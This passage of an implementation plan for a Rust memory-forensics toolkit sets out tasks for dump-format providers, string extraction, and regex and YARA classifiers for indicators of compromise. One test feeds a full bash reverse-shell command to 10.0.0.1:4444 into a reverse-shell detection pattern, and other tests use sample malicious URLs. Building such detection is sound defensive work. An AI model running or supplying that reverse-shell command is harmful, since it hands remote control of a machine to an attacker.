        let provider = AvmlProvider::from_bytes(&dump).unwrap();

        let mut buf = [0u8; 4];
        let n = provider.read_phys(0x0000, &mut buf).unwrap();
        assert_eq!(n, 0);
    }
}
```

- [ ] **Step 2: Register avml module in lib.rs**

Add to `~/src/memory-forensic/crates/memf-format/src/lib.rs`:

```rust
pub mod avml;
```

- [ ] **Step 3: Run tests**

Run: `cargo test -p memf-format`
Expected: All tests pass (lib: 3, lime: 7, avml: 5 = 15 total)

- [ ] **Step 4: Commit**

```bash
cd ~/src/memory-forensic
git add crates/memf-format/src/avml.rs crates/memf-format/src/lib.rs
git commit -m "feat(memf-format): AVML v2 provider with Snappy decompression"
```

---

### Task 5: memf-format — Raw Format Provider

**Files:**
- Create: `~/src/memory-forensic/crates/memf-format/src/raw.rs`
- Modify: `~/src/memory-forensic/crates/memf-format/src/lib.rs`

- [ ] **Step 1: Write raw provider + tests**

```rust
// ~/src/memory-forensic/crates/memf-format/src/raw.rs
//! Raw/padded memory dump format provider.
//!
//! A raw dump is simply a contiguous block of physical memory starting at
//! address 0. This is the lowest-confidence fallback format — it matches
//! any file but with confidence 5.

use crate::{FormatPlugin, PhysicalMemoryProvider, PhysicalRange, Result};
use std::path::Path;

/// Physical memory provider for raw dumps.
pub struct RawProvider {
    data: Vec<u8>,
    ranges: Vec<PhysicalRange>,
}

impl RawProvider {
    /// Open a raw dump from bytes (for testing).
    pub fn from_bytes(bytes: &[u8]) -> Self {
        let ranges = if bytes.is_empty() {
            Vec::new()
        } else {
            vec![PhysicalRange {
                start: 0,
                end: bytes.len() as u64,
            }]
        };
        Self {
            data: bytes.to_vec(),
            ranges,
        }
    }

    /// Open a raw dump from a file path.
    pub fn from_path(path: &Path) -> Result<Self> {
        let data = std::fs::read(path)?;
        let ranges = if data.is_empty() {
            Vec::new()
        } else {
            vec![PhysicalRange {
                start: 0,
                end: data.len() as u64,
            }]
        };
        Ok(Self { data, ranges })
    }
}

impl PhysicalMemoryProvider for RawProvider {
    fn read_phys(&self, addr: u64, buf: &mut [u8]) -> Result<usize> {
        let addr = addr as usize;
        if addr >= self.data.len() {
            return Ok(0);
        }
        let available = self.data.len() - addr;
        let to_read = buf.len().min(available);
        buf[..to_read].copy_from_slice(&self.data[addr..addr + to_read]);
        Ok(to_read)
    }

    fn ranges(&self) -> &[PhysicalRange] {
        &self.ranges
    }

    fn format_name(&self) -> &str {
        "Raw"
    }
}

/// Raw format plugin — lowest confidence fallback.
struct RawPlugin;

impl FormatPlugin for RawPlugin {
    fn name(&self) -> &str {
        "Raw"
    }

    fn probe(&self, header: &[u8]) -> u8 {
        // Accept anything non-empty, but with very low confidence.
        if header.is_empty() {
            0
        } else {
            5
        }
    }

    fn open(&self, path: &Path) -> Result<Box<dyn PhysicalMemoryProvider>> {
        Ok(Box::new(RawProvider::from_path(path)?))
    }
}

inventory::submit!(&RawPlugin as &dyn FormatPlugin);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn probe_confidence() {
        let plugin = RawPlugin;
        assert_eq!(plugin.probe(&[0; 64]), 5);
        assert_eq!(plugin.probe(&[]), 0);
    }

    #[test]
    fn read_from_start() {
        let data = vec![0x11, 0x22, 0x33, 0x44];
        let provider = RawProvider::from_bytes(&data);

        assert_eq!(provider.ranges().len(), 1);
        assert_eq!(provider.total_size(), 4);
        assert_eq!(provider.format_name(), "Raw");

        let mut buf = [0u8; 4];
        let n = provider.read_phys(0, &mut buf).unwrap();
        assert_eq!(n, 4);
        assert_eq!(buf, [0x11, 0x22, 0x33, 0x44]);
    }

    #[test]
    fn read_past_end() {
        let provider = RawProvider::from_bytes(&[0xAA; 8]);
        let mut buf = [0u8; 4];
        let n = provider.read_phys(100, &mut buf).unwrap();
        assert_eq!(n, 0);
    }

    #[test]
    fn read_partial() {
        let provider = RawProvider::from_bytes(&[0xBB; 4]);
        let mut buf = [0u8; 8];
        let n = provider.read_phys(2, &mut buf).unwrap();
        assert_eq!(n, 2);
        assert_eq!(&buf[..2], &[0xBB; 2]);
    }

    #[test]
    fn empty_dump() {
        let provider = RawProvider::from_bytes(&[]);
        assert!(provider.ranges().is_empty());
        assert_eq!(provider.total_size(), 0);
    }
}
```

- [ ] **Step 2: Register raw module in lib.rs**

Add to `~/src/memory-forensic/crates/memf-format/src/lib.rs`:

```rust
pub mod raw;
```

- [ ] **Step 3: Run tests**

Run: `cargo test -p memf-format`
Expected: All tests pass (lib: 3, lime: 7, avml: 5, raw: 5 = 20 total)

- [ ] **Step 4: Commit**

```bash
cd ~/src/memory-forensic
git add crates/memf-format/src/raw.rs crates/memf-format/src/lib.rs
git commit -m "feat(memf-format): raw dump fallback provider"
```

---

### Task 6: memf-format — Open Dump Integration Test

**Files:**
- Modify: `~/src/memory-forensic/crates/memf-format/src/lib.rs` (add integration tests)

- [ ] **Step 1: Write integration tests for open_dump with temp files**

Add to the `#[cfg(test)] mod tests` in `lib.rs`:

```rust
    #[test]
    fn open_dump_lime() {
        use crate::test_builders::LimeBuilder;
        let dump = LimeBuilder::new()
            .add_range(0, &[0xAA; 128])
            .build();
        let dir = std::env::temp_dir().join("memf_test_lime");
        std::fs::write(&dir, &dump).unwrap();
        let provider = open_dump(&dir).unwrap();
        assert_eq!(provider.format_name(), "LiME");
        assert_eq!(provider.total_size(), 128);
        std::fs::remove_file(&dir).ok();
    }

    #[test]
    fn open_dump_avml() {
        use crate::test_builders::AvmlBuilder;
        let dump = AvmlBuilder::new()
            .add_range(0, &[0xBB; 128])
            .build();
        let dir = std::env::temp_dir().join("memf_test_avml");
        std::fs::write(&dir, &dump).unwrap();
        let provider = open_dump(&dir).unwrap();
        assert_eq!(provider.format_name(), "AVML v2");
        assert_eq!(provider.total_size(), 128);
        std::fs::remove_file(&dir).ok();
    }

    #[test]
    fn open_dump_unknown_is_raw_fallback() {
        let data = vec![0x00; 1024];
        let dir = std::env::temp_dir().join("memf_test_raw");
        std::fs::write(&dir, &data).unwrap();
        // Raw plugin scores 5 which is < 20, so open_dump should
        // fall through. We need to adjust: raw scores 5, which is
        // below the 20 threshold. That means a completely unknown
        // file currently returns UnknownFormat. This is correct:
        // raw should only be used when explicitly requested via --format.
        let result = open_dump(&dir);
        assert!(result.is_err());
        std::fs::remove_file(&dir).ok();
    }
```

- [ ] **Step 2: Run tests**

Run: `cargo test -p memf-format`
Expected: All tests pass (23 total)

- [ ] **Step 3: Commit**

```bash
cd ~/src/memory-forensic
git add crates/memf-format/src/lib.rs
git commit -m "test(memf-format): integration tests for open_dump probing"
```

---

### Task 7: memf-strings — Core Types and Enums

**Files:**
- Modify: `~/src/memory-forensic/crates/memf-strings/src/lib.rs`

- [ ] **Step 1: Write core types**

```rust
// ~/src/memory-forensic/crates/memf-strings/src/lib.rs
#![deny(unsafe_code)]
#![warn(missing_docs)]
//! String extraction and IoC classification for memory forensics.

pub mod classify;
pub mod extract;
pub mod from_file;
pub mod regex_classifier;
pub mod yara_classifier;

/// A string extracted from memory, classified into zero or more categories.
#[derive(Debug, Clone)]
pub struct ClassifiedString {
    /// The extracted string value.
    pub value: String,
    /// Physical offset in the memory dump (0 if from a file).
    pub physical_offset: u64,
    /// How this string was encoded in memory.
    pub encoding: StringEncoding,
    /// Classification results (may be empty for uncategorized strings).
    pub categories: Vec<(StringCategory, f32)>,
}

/// String encoding as found in memory.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum StringEncoding {
    /// ASCII (printable bytes 0x20–0x7E).
    Ascii,
    /// UTF-8.
    Utf8,
    /// UTF-16 Little Endian.
    Utf16Le,
}

/// Classification category for an extracted string.
#[derive(Debug, Clone, PartialEq)]
pub enum StringCategory {
    /// URL (http, https, ftp, file, data).
    Url,
    /// IPv4 address.
    IpV4,
    /// IPv6 address.
    IpV6,
    /// Email address.
    Email,
    /// Unix file path.
    UnixPath,
    /// Windows file path.
    WindowsPath,
    /// Windows registry key path.
    RegistryKey,
    /// Domain name.
    DomainName,
    /// Cryptocurrency address (Bitcoin, Ethereum, Monero).
    CryptoAddress,
    /// Private key material (PEM, SSH, etc.).
    PrivateKey,
    /// Base64-encoded blob (20+ chars).
    Base64Blob,
    /// Shell command or reverse shell indicator.
    ShellCommand,
    /// YARA rule match (rule name stored in string).
    YaraMatch(String),
}

/// Error type for memf-strings operations.
#[derive(Debug, thiserror::Error)]
pub enum Error {
    /// I/O error.
    #[error("I/O error: {0}")]
    Io(#[from] std::io::Error),

    /// Error from the format crate.
    #[error("format error: {0}")]
    Format(#[from] memf_format::Error),

    /// YARA compilation error.
    #[error("YARA error: {0}")]
    Yara(String),
}

/// Result alias for memf-strings.
pub type Result<T> = std::result::Result<T, Error>;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn classified_string_basic() {
        let cs = ClassifiedString {
            value: "https://example.com".into(),
            physical_offset: 0x1234,
            encoding: StringEncoding::Ascii,
            categories: vec![(StringCategory::Url, 0.95)],
        };
        assert_eq!(cs.value, "https://example.com");
        assert_eq!(cs.physical_offset, 0x1234);
        assert_eq!(cs.categories.len(), 1);
    }
}
```

- [ ] **Step 2: Create empty module stubs**

Create these four empty files so `pub mod` declarations compile:

```rust
// ~/src/memory-forensic/crates/memf-strings/src/extract.rs
//! String extraction from physical memory.

// ~/src/memory-forensic/crates/memf-strings/src/classify.rs
//! Classifier pipeline orchestration.

// ~/src/memory-forensic/crates/memf-strings/src/regex_classifier.rs
//! Regex-based string classifier.

// ~/src/memory-forensic/crates/memf-strings/src/yara_classifier.rs
//! YARA-X based string classifier.

// ~/src/memory-forensic/crates/memf-strings/src/from_file.rs
//! Pre-extracted string file parser.
```

- [ ] **Step 3: Run tests**

Run: `cargo test -p memf-strings`
Expected: 1 test passes

- [ ] **Step 4: Commit**

```bash
cd ~/src/memory-forensic
git add crates/memf-strings/src/
git commit -m "feat(memf-strings): core types, enums, and module stubs"
```

---

### Task 8: memf-strings — String Extractor

**Files:**
- Modify: `~/src/memory-forensic/crates/memf-strings/src/extract.rs`

- [ ] **Step 1: Write failing tests then implementation**

```rust
// ~/src/memory-forensic/crates/memf-strings/src/extract.rs
//! String extraction from physical memory.
//!
//! Scans physical memory ranges and extracts printable ASCII, UTF-8,
//! and UTF-16LE strings above a configurable minimum length.

use crate::{ClassifiedString, StringEncoding};
use memf_format::PhysicalMemoryProvider;

/// Configuration for string extraction.
#[derive(Debug, Clone)]
pub struct ExtractConfig {
    /// Minimum string length to extract (default: 4).
    pub min_length: usize,
    /// Whether to extract ASCII strings.
    pub ascii: bool,
    /// Whether to extract UTF-16LE strings.
    pub utf16le: bool,
}

impl Default for ExtractConfig {
    fn default() -> Self {
        Self {
            min_length: 4,
            ascii: true,
            utf16le: true,
        }
    }
}

/// Extract strings from a physical memory provider.
pub fn extract_strings(
    provider: &dyn PhysicalMemoryProvider,
    config: &ExtractConfig,
) -> Vec<ClassifiedString> {
    let mut results = Vec::new();
    let buf_size = 64 * 1024; // 64 KB read buffer
    let mut buf = vec![0u8; buf_size];

    for range in provider.ranges() {
        let mut addr = range.start;
        // Carry-over for strings that span buffer boundaries
        let mut ascii_acc: Vec<u8> = Vec::new();
        let mut ascii_start = addr;

        while addr < range.end {
            let to_read = buf.len().min((range.end - addr) as usize);
            let n = match provider.read_phys(addr, &mut buf[..to_read]) {
                Ok(n) => n,
                Err(_) => break,
            };
            if n == 0 {
                break;
            }

            if config.ascii {
                for i in 0..n {
                    let b = buf[i];
                    if is_printable_ascii(b) {
                        if ascii_acc.is_empty() {
                            ascii_start = addr + i as u64;
                        }
                        ascii_acc.push(b);
                    } else {
                        if ascii_acc.len() >= config.min_length {
                            let value = String::from_utf8_lossy(&ascii_acc).into_owned();
                            results.push(ClassifiedString {
                                value,
                                physical_offset: ascii_start,
                                encoding: StringEncoding::Ascii,
                                categories: Vec::new(),
                            });
                        }
                        ascii_acc.clear();
                    }
                }
            }

            if config.utf16le && n >= 2 {
                extract_utf16le_from_buf(&buf[..n], addr, config.min_length, &mut results);
            }

            addr += n as u64;
        }

        // Flush remaining ASCII accumulator
        if ascii_acc.len() >= config.min_length {
            let value = String::from_utf8_lossy(&ascii_acc).into_owned();
            results.push(ClassifiedString {
                value,
                physical_offset: ascii_start,
                encoding: StringEncoding::Ascii,
                categories: Vec::new(),
            });
        }
    }

    results
}

fn is_printable_ascii(b: u8) -> bool {
    (0x20..=0x7E).contains(&b) || b == b'\t' || b == b'\n' || b == b'\r'
}

fn extract_utf16le_from_buf(
    buf: &[u8],
    base_addr: u64,
    min_length: usize,
    results: &mut Vec<ClassifiedString>,
) {
    let mut chars: Vec<u16> = Vec::new();
    let mut start_offset = 0u64;

    let mut i = 0;
    while i + 1 < buf.len() {
        let code_unit = u16::from_le_bytes([buf[i], buf[i + 1]]);
        if is_printable_utf16(code_unit) {
            if chars.is_empty() {
                start_offset = base_addr + i as u64;
            }
            chars.push(code_unit);
        } else {
            if chars.len() >= min_length {
                let value = String::from_utf16_lossy(&chars);
                results.push(ClassifiedString {
                    value,
                    physical_offset: start_offset,
                    encoding: StringEncoding::Utf16Le,
                    categories: Vec::new(),
                });
            }
            chars.clear();
        }
        i += 2;
    }

    if chars.len() >= min_length {
        let value = String::from_utf16_lossy(&chars);
        results.push(ClassifiedString {
            value,
            physical_offset: start_offset,
            encoding: StringEncoding::Utf16Le,
            categories: Vec::new(),
        });
    }
}

fn is_printable_utf16(c: u16) -> bool {
    (0x0020..=0x007E).contains(&c) || c == 0x0009 || c == 0x000A || c == 0x000D
}

#[cfg(test)]
mod tests {
    use super::*;
    use memf_format::raw::RawProvider;

    #[test]
    fn extract_ascii_basic() {
        // "Hello\0World\0" embedded in zeros
        let mut data = vec![0u8; 64];
        data[4..9].copy_from_slice(b"Hello");
        data[16..21].copy_from_slice(b"World");

        let provider = RawProvider::from_bytes(&data);
        let config = ExtractConfig {
            min_length: 4,
            ascii: true,
            utf16le: false,
        };
        let strings = extract_strings(&provider, &config);

        assert_eq!(strings.len(), 2);
        assert_eq!(strings[0].value, "Hello");
        assert_eq!(strings[0].physical_offset, 4);
        assert_eq!(strings[0].encoding, StringEncoding::Ascii);
        assert_eq!(strings[1].value, "World");
    }

    #[test]
    fn min_length_filters_short_strings() {
        let mut data = vec![0u8; 32];
        data[0..2].copy_from_slice(b"Hi"); // too short (2 < 4)
        data[8..14].copy_from_slice(b"Longer");

        let provider = RawProvider::from_bytes(&data);
        let config = ExtractConfig {
            min_length: 4,
            ascii: true,
            utf16le: false,
        };
        let strings = extract_strings(&provider, &config);

        assert_eq!(strings.len(), 1);
        assert_eq!(strings[0].value, "Longer");
    }

    #[test]
    fn extract_utf16le() {
        // "Test" in UTF-16LE: T\0e\0s\0t\0
        let mut data = vec![0u8; 32];
        data[0..8].copy_from_slice(&[b'T', 0, b'e', 0, b's', 0, b't', 0]);

        let provider = RawProvider::from_bytes(&data);
        let config = ExtractConfig {
            min_length: 4,
            ascii: false,
            utf16le: true,
        };
        let strings = extract_strings(&provider, &config);

        assert_eq!(strings.len(), 1);
        assert_eq!(strings[0].value, "Test");
        assert_eq!(strings[0].encoding, StringEncoding::Utf16Le);
    }

    #[test]
    fn empty_dump() {
        let provider = RawProvider::from_bytes(&[]);
        let strings = extract_strings(&provider, &ExtractConfig::default());
        assert!(strings.is_empty());
    }
}
```

- [ ] **Step 2: Run tests**

Run: `cargo test -p memf-strings`
Expected: 5 tests pass (1 from lib + 4 from extract)

- [ ] **Step 3: Commit**

```bash
cd ~/src/memory-forensic
git add crates/memf-strings/src/extract.rs
git commit -m "feat(memf-strings): string extractor with ASCII and UTF-16LE support"
```

---

### Task 9: memf-strings — Regex Classifier

**Files:**
- Modify: `~/src/memory-forensic/crates/memf-strings/src/regex_classifier.rs`
- Modify: `~/src/memory-forensic/crates/memf-strings/src/classify.rs`

- [ ] **Step 1: Write the StringClassifier trait in classify.rs**

```rust
// ~/src/memory-forensic/crates/memf-strings/src/classify.rs
//! Classifier pipeline orchestration.

use crate::{ClassifiedString, StringCategory};

/// A classifier that examines a string and returns matching categories.
pub trait StringClassifier: Send + Sync {
    /// Human-readable name for this classifier.
    fn name(&self) -> &str;

    /// Classify a string. Returns a list of (category, confidence) pairs.
    fn classify(&self, input: &str) -> Vec<(StringCategory, f32)>;
}

inventory::collect!(Box<dyn StringClassifier>);

/// Run all registered classifiers on a list of strings, populating their categories.
pub fn classify_strings(strings: &mut [ClassifiedString]) {
    let classifiers: Vec<&Box<dyn StringClassifier>> = inventory::iter::<Box<dyn StringClassifier>>.into_iter().collect();
    for s in strings.iter_mut() {
        for classifier in &classifiers {
            let matches = classifier.classify(&s.value);
            s.categories.extend(matches);
        }
    }
}
```

- [ ] **Step 2: Write the regex classifier**

```rust
// ~/src/memory-forensic/crates/memf-strings/src/regex_classifier.rs
//! Regex-based string classifier for URLs, IPs, emails, paths, and credentials.

use crate::classify::StringClassifier;
use crate::StringCategory;
use regex::Regex;
use std::sync::OnceLock;

struct PatternEntry {
    regex: Regex,
    category: StringCategory,
    confidence: f32,
}

fn patterns() -> &'static [PatternEntry] {
    static PATTERNS: OnceLock<Vec<PatternEntry>> = OnceLock::new();
    PATTERNS.get_or_init(|| vec![
        PatternEntry {
            regex: Regex::new(r"(?i)^https?://[^\s<>\"'{}|\\^`\[\]]+$").unwrap(),
            category: StringCategory::Url,
            confidence: 0.90,
        },
        PatternEntry {
            regex: Regex::new(r"^(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]\d|\d)\.){3}(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]\d|\d)$").unwrap(),
            category: StringCategory::IpV4,
            confidence: 0.95,
        },
        PatternEntry {
            regex: Regex::new(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$").unwrap(),
            category: StringCategory::Email,
            confidence: 0.90,
        },
        PatternEntry {
            regex: Regex::new(r"^/(?:usr|etc|var|tmp|home|opt|dev|proc|sys|root|bin|sbin|lib|mnt|run|srv)/[^\s:*?<>|]+$").unwrap(),
            category: StringCategory::UnixPath,
            confidence: 0.85,
        },
        PatternEntry {
            regex: Regex::new(r"(?i)^[A-Z]:\\(?:[^\\/:*?<>|\r\n]+\\)*[^\\/:*?<>|\r\n]*$").unwrap(),
            category: StringCategory::WindowsPath,
            confidence: 0.85,
        },
        PatternEntry {
            regex: Regex::new(r"(?i)^HK(?:EY_(?:LOCAL_MACHINE|CURRENT_USER|CLASSES_ROOT|USERS|CURRENT_CONFIG)|LM|CU|CR)\\").unwrap(),
            category: StringCategory::RegistryKey,
            confidence: 0.95,
        },
        // Bitcoin addresses
        PatternEntry {
            regex: Regex::new(r"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$").unwrap(),
            category: StringCategory::CryptoAddress,
            confidence: 0.70,
        },
        // Ethereum addresses
        PatternEntry {
            regex: Regex::new(r"^0x[0-9a-fA-F]{40}$").unwrap(),
            category: StringCategory::CryptoAddress,
            confidence: 0.80,
        },
        // Bitcoin SegWit
        PatternEntry {
            regex: Regex::new(r"^bc1[a-zA-HJ-NP-Z0-9]{25,39}$").unwrap(),
            category: StringCategory::CryptoAddress,
            confidence: 0.85,
        },
        // PEM private keys
        PatternEntry {
            regex: Regex::new(r"-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----").unwrap(),
            category: StringCategory::PrivateKey,
            confidence: 0.99,
        },
        // Base64 blobs (20+ chars)
        PatternEntry {
            regex: Regex::new(r"^[A-Za-z0-9+/]{20,}={0,2}$").unwrap(),
            category: StringCategory::Base64Blob,
            confidence: 0.40,
        },
        // Reverse shell indicators
        PatternEntry {
            regex: Regex::new(r"/dev/tcp/|/dev/udp/|pty\.spawn|os\.dup2\(|bash\s+-i\s+>&").unwrap(),
            category: StringCategory::ShellCommand,
            confidence: 0.90,
        },
    ])
}

/// A classifier that uses compiled regexes to categorize strings.
pub struct RegexClassifier;

impl StringClassifier for RegexClassifier {
    fn name(&self) -> &str {
        "regex"
    }

    fn classify(&self, input: &str) -> Vec<(StringCategory, f32)> {
        let mut results = Vec::new();
        for entry in patterns() {
            if entry.regex.is_match(input) {
                results.push((entry.category.clone(), entry.confidence));
            }
        }
        results
    }
}

inventory::submit!(Box::new(RegexClassifier) as Box<dyn StringClassifier>);

#[cfg(test)]
mod tests {
    use super::*;

    fn classify(input: &str) -> Vec<(StringCategory, f32)> {
        RegexClassifier.classify(input)
    }

    #[test]
    fn classifies_url() {
        let r = classify("https://evil.com/payload.exe");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::Url));
    }

    #[test]
    fn classifies_ipv4() {
        let r = classify("192.168.1.1");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::IpV4));
    }

    #[test]
    fn classifies_email() {
        let r = classify("user@example.com");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::Email));
    }

    #[test]
    fn classifies_unix_path() {
        let r = classify("/etc/passwd");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::UnixPath));
    }

    #[test]
    fn classifies_windows_path() {
        let r = classify("C:\\Windows\\System32\\cmd.exe");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::WindowsPath));
    }

    #[test]
    fn classifies_registry_key() {
        let r = classify("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::RegistryKey));
    }

    #[test]
    fn classifies_ethereum_address() {
        let r = classify("0x742d35Cc6634C0532925a3b844Bc9e7595f2bD28");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::CryptoAddress));
    }

    #[test]
    fn classifies_pem_private_key() {
        let r = classify("-----BEGIN RSA PRIVATE KEY-----");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::PrivateKey));
    }

    #[test]
    fn classifies_shell_command() {
        let r = classify("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::ShellCommand));
    }

    #[test]
    fn no_match_for_garbage() {
        let r = classify("xyzq");
        assert!(r.is_empty());
    }
}
```

- [ ] **Step 3: Run tests**

Run: `cargo test -p memf-strings`
Expected: 16 tests pass (1 lib + 4 extract + 1 classify + 10 regex)

- [ ] **Step 4: Commit**

```bash
cd ~/src/memory-forensic
git add crates/memf-strings/src/classify.rs crates/memf-strings/src/regex_classifier.rs
git commit -m "feat(memf-strings): regex classifier with 12 patterns for IoC detection"
```

---

### Task 10: memf-strings — From-File Parser

**Files:**
- Modify: `~/src/memory-forensic/crates/memf-strings/src/from_file.rs`

- [ ] **Step 1: Write the from-file parser + tests**

```rust
// ~/src/memory-forensic/crates/memf-strings/src/from_file.rs
//! Parser for pre-extracted string files (one string per line).
//!
//! Supports two formats:
//! 1. Raw: one string per line (no offset info)
//! 2. Offset-prefixed: `<offset>: <string>` (decimal or hex offset)

use crate::{ClassifiedString, Result, StringEncoding};
use std::io::BufRead;
use std::path::Path;

/// Parse a pre-extracted strings file into `ClassifiedString` values.
///
/// Each line becomes one `ClassifiedString` with empty categories
/// (to be classified later by the pipeline).
pub fn from_strings_file(path: &Path) -> Result<Vec<ClassifiedString>> {
    let file = std::fs::File::open(path)?;
    let reader = std::io::BufReader::new(file);
    let mut results = Vec::new();

    for (line_num, line) in reader.lines().enumerate() {
        let line = line?;
        let trimmed = line.trim_end();
        if trimmed.is_empty() {
            continue;
        }

        let (offset, value) = parse_line(trimmed, line_num as u64);
        results.push(ClassifiedString {
            value,
            physical_offset: offset,
            encoding: StringEncoding::Ascii,
            categories: Vec::new(),
        });
    }

    Ok(results)
}

/// Parse a single line, detecting offset-prefixed format.
fn parse_line(line: &str, line_num: u64) -> (u64, String) {
    // Try offset-prefixed format: "1234: some string" or "0x1234: some string"
    if let Some(colon_pos) = line.find(": ") {
        let prefix = &line[..colon_pos];
        let prefix = prefix.trim();
        if let Some(offset) = parse_offset(prefix) {
            let value = line[colon_pos + 2..].to_string();
            return (offset, value);
        }
    }
    // Raw format: use line number as pseudo-offset
    (line_num, line.to_string())
}

fn parse_offset(s: &str) -> Option<u64> {
    if let Some(hex) = s.strip_prefix("0x").or_else(|| s.strip_prefix("0X")) {
        u64::from_str_radix(hex, 16).ok()
    } else {
        s.parse::<u64>().ok()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    fn write_temp_file(content: &str) -> std::path::PathBuf {
        let path = std::env::temp_dir().join(format!("memf_test_strings_{}", std::process::id()));
        let mut f = std::fs::File::create(&path).unwrap();
        f.write_all(content.as_bytes()).unwrap();
        path
    }

    #[test]
    fn raw_format() {
        let path = write_temp_file("Hello World\n/etc/passwd\nhttps://evil.com\n");
        let strings = from_strings_file(&path).unwrap();
        assert_eq!(strings.len(), 3);
        assert_eq!(strings[0].value, "Hello World");
        assert_eq!(strings[1].value, "/etc/passwd");
        assert_eq!(strings[2].value, "https://evil.com");
        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn offset_prefixed_decimal() {
        let path = write_temp_file("1000: Hello\n2000: World\n");
        let strings = from_strings_file(&path).unwrap();
        assert_eq!(strings.len(), 2);
        assert_eq!(strings[0].physical_offset, 1000);
        assert_eq!(strings[0].value, "Hello");
        assert_eq!(strings[1].physical_offset, 2000);
        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn offset_prefixed_hex() {
        let path = write_temp_file("0x1A2B: hex string\n");
        let strings = from_strings_file(&path).unwrap();
        assert_eq!(strings.len(), 1);
        assert_eq!(strings[0].physical_offset, 0x1A2B);
        assert_eq!(strings[0].value, "hex string");
        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn skips_empty_lines() {
        let path = write_temp_file("line1\n\n\nline2\n");
        let strings = from_strings_file(&path).unwrap();
        assert_eq!(strings.len(), 2);
        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn string_with_colon_but_no_offset() {
        let path = write_temp_file("http://example.com:8080/path\n");
        let strings = from_strings_file(&path).unwrap();
        assert_eq!(strings.len(), 1);
        // "http" is not a valid offset, so the whole line is the value
        assert_eq!(strings[0].value, "http://example.com:8080/path");
        std::fs::remove_file(&path).ok();
    }
}
```

- [ ] **Step 2: Run tests**

Run: `cargo test -p memf-strings`
Expected: 21 tests pass

- [ ] **Step 3: Commit**

```bash
cd ~/src/memory-forensic
git add crates/memf-strings/src/from_file.rs
git commit -m "feat(memf-strings): from-file parser for pre-extracted string files"
```

---

### Task 11: memf-strings — YARA-X Classifier

**Files:**
- Modify: `~/src/memory-forensic/crates/memf-strings/src/yara_classifier.rs`

- [ ] **Step 1: Write YARA classifier + tests**

```rust
// ~/src/memory-forensic/crates/memf-strings/src/yara_classifier.rs
//! YARA-X rule-based string classifier.
//!
//! Scans strings against compiled YARA rules and returns matches
//! as `StringCategory::YaraMatch(rule_name)`.

use crate::classify::StringClassifier;
use crate::{Error, StringCategory};
use std::path::Path;

/// A classifier that matches strings against YARA-X rules.
pub struct YaraClassifier {
    rules: yara_x::Rules,
}

impl YaraClassifier {
    /// Compile YARA rules from source text.
    pub fn from_source(source: &str) -> crate::Result<Self> {
        let rules = yara_x::compile(source).map_err(|e| Error::Yara(e.to_string()))?;
        Ok(Self { rules })
    }

    /// Load and compile all `.yar` / `.yara` files from a directory.
    pub fn from_rules_dir(dir: &Path) -> crate::Result<Self> {
        let mut compiler = yara_x::Compiler::new();
        let mut found = false;

        if dir.is_dir() {
            for entry in std::fs::read_dir(dir)? {
                let entry = entry?;
                let path = entry.path();
                if let Some(ext) = path.extension() {
                    if ext == "yar" || ext == "yara" {
                        let source = std::fs::read_to_string(&path)?;
                        compiler
                            .add_source(source.as_str())
                            .map_err(|e| Error::Yara(e.to_string()))?;
                        found = true;
                    }
                }
            }
        }

        if !found {
            return Err(Error::Yara(format!("no .yar/.yara files found in {}", dir.display())));
        }

        let rules = compiler.build();
        Ok(Self { rules })
    }

    /// Scan a single string against the compiled rules.
    pub fn scan_string(&self, input: &str) -> Vec<(StringCategory, f32)> {
        let mut scanner = yara_x::Scanner::new(&self.rules);
        let results = scanner.scan(input.as_bytes());
        match results {
            Ok(scan_results) => scan_results
                .matching_rules()
                .map(|rule| {
                    (
                        StringCategory::YaraMatch(rule.identifier().to_string()),
                        0.85,
                    )
                })
                .collect(),
            Err(_) => Vec::new(),
        }
    }
}

impl StringClassifier for YaraClassifier {
    fn name(&self) -> &str {
        "yara"
    }

    fn classify(&self, input: &str) -> Vec<(StringCategory, f32)> {
        self.scan_string(input)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn match_simple_rule() {
        let source = r#"
rule test_url {
    strings:
        $url = /https?:\/\/[^\s]+/
    condition:
        $url
}
"#;
        let classifier = YaraClassifier::from_source(source).unwrap();
        let matches = classifier.scan_string("https://malware.example.com/payload");
        assert_eq!(matches.len(), 1);
        assert!(matches!(matches[0].0, StringCategory::YaraMatch(ref name) if name == "test_url"));
    }

    #[test]
    fn no_match() {
        let source = r#"
rule test_never {
    strings:
        $never = "THIS_WILL_NEVER_MATCH_ANYTHING_12345"
    condition:
        $never
}
"#;
        let classifier = YaraClassifier::from_source(source).unwrap();
        let matches = classifier.scan_string("hello world");
        assert!(matches.is_empty());
    }

    #[test]
    fn multiple_rules() {
        let source = r#"
rule has_ip {
    strings:
        $ip = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/
    condition:
        $ip
}

rule has_http {
    strings:
        $http = "http"
    condition:
        $http
}
"#;
        let classifier = YaraClassifier::from_source(source).unwrap();
        let matches = classifier.scan_string("http://10.0.0.1/shell");
        assert_eq!(matches.len(), 2);
    }

    #[test]
    fn invalid_rule_source_errors() {
        let result = YaraClassifier::from_source("not valid yara");
        assert!(result.is_err());
    }
}
```

- [ ] **Step 2: Run tests**

Run: `cargo test -p memf-strings`
Expected: 25 tests pass

- [ ] **Step 3: Commit**

